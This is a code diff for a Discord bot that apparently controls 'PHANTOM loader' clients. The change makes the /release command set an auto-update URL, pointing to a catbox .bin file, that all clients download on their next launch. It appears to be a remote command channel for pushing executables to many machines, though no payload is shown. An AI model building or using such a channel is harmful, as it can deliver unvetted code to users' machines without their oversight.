@@ -338,9 +338,9 @@ const commands = [
       { name: 'warn', value: 'warn' }, { name: 'error', value: 'error' })),
   new SlashCommandBuilder().setName('broadcast').setDescription('Message every client')
     .addStringOption((o) => o.setName('text').setDescription('Message').setRequired(true)),
-  new SlashCommandBuilder().setName('release').setDescription('Upload new loader build — triggers auto-update on all clients')
-    .addStringOption((o) => o.setName('version').setDescription('Version string e.g. 3 or 3.1').setRequired(true))
-    .addAttachmentOption((o) => o.setName('file').setDescription('New loader EXE').setRequired(true)),
+  new SlashCommandBuilder().setName('release').setDescription('Push a new loader build — triggers auto-update on all clients')
+    .addStringOption((o) => o.setName('version').setDescription('Version number e.g. 3 or 3.1').setRequired(true))
+    .addStringOption((o) => o.setName('url').setDescription('Direct download link (catbox .bin URL)').setRequired(true)),
   new SlashCommandBuilder().setName('loaderconfig').setDescription('Update PHANTOM loader config')
     .addSubcommand((s) => s.setName('set')
       .setDescription('Set one field')
@@ -418,11 +418,11 @@ client.on('interactionCreate', async (i) => {
     }
     case 'release': {
       const ver = i.options.getString('version');
-      const att = i.options.getAttachment('file');
+      const url = i.options.getString('url');
       loaderCfg.version    = ver;
-      loaderCfg.update_url = att.url;
+      loaderCfg.update_url = url;
       saveLoaderCfg();
-      return ok(`Released **v${ver}**\nClients will update on next launch.\n\n> URL expires ~24h — re-run \`/release\` if older clients still need it.`);
+      return ok(`Released **v${ver}** → <${url}>\nAll clients will update on next launch.`);
     }
     case 'loaderconfig': {
       const sub = i.options.getSubcommand();
